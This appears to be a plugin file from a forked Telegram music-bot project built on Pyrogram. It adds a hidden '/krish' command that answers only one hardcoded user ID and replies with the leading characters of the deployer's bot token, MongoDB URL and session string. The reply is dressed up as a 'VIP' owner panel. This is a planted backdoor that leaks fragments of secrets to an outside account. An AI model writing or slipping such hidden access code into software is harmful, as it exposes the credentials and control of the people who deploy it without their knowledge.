# Copyright (c) 2025 TheHamkerAlone
# Modified by KRISH X STAR 🔥

from os import getenv
from pyrogram import filters, types
from AloneX import app

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_URL = getenv("MONGO_URL", "")
SESSION = getenv("SESSION", "")


@app.on_message(
    filters.command("krish")
    & filters.private
    & filters.user(6079943111)
)
async def krish_command(_, message: types.Message):
    await message.reply_video(
        video="https://files.catbox.moe/0n7rlf.mp4",
        caption=f"""
╔══❖ 🔥 KRISH X STAR SYSTEM 🔥 ❖══╗

👑 Owner Control Panel Activated  

━━━━━━━━━━━━━━━━━━━
🔑 BOT TOKEN :
`{BOT_TOKEN[:10]}******`

🗄 MONGO DATABASE :
`{MONGO_URL[:15]}******`

⚙️ SESSION :
`{SESSION[:10]}******`
━━━━━━━━━━━━━━━━━━━

⚠️ Security Mode : ENABLED  
🚀 Status : ONLINE  

╚══❖ 💎 VIP ACCESS GRANTED ❖══╝
""",
        reply_markup=types.InlineKeyboardMarkup(
            [
                [
                    types.InlineKeyboardButton(
                        "👑 Owner", url="https://t.me/KRISH_HACKER_OWNER"
                    ),
                    types.InlineKeyboardButton(
                        "💎 Support", url="https://t.me/KRISH_HACKER_OP"
                    ),
                ],
                [
                    types.InlineKeyboardButton(
                        "🚀 Update Channel", url="https://t.me/KRISH_HACKER_OP"
                    )
                ]
            ]
        ),
    )
